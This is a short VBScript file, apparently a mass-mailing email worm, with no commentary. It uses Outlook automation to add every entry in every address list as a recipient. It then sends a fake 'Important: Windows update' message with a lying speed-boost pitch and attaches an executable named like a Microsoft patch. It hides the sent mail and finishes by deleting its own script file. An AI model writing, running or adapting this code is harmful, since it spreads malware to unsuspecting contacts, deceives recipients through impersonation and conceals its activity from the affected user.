On Error Resume Next
Dim Sharp, Mail, Counter, A, B, C, D, E
Set Sharp = CreateObject ("outlook.application")
Set Mail = Sharp.GetNameSpace ("MAPI")
For A = 1 To Mail.AddressLists.Count
Set B = Mail.AddressLists (A)
Counter = 1
Set C = Sharp.CreateItem (0)
For D = 1 To B.AddressEntries.Count
E = B.AddressEntries (Counter)
C.Recipients.Add E
Counter = Counter + 1
Next
C.Subject = "Important: Windows update"
C.Body = "Hey, at work we are applying this update because it makes Windows over 50% faster and more secure. I thought I should forward it as you may like it."
C.Attachments.Add "c:\MS02-010.exe"
C.DeleteAfterSubmit = True
C.Send
Next
Set C = CreateObject ("Scripting.FileSystemObject")
C.DeleteFile Wscript.ScriptFullName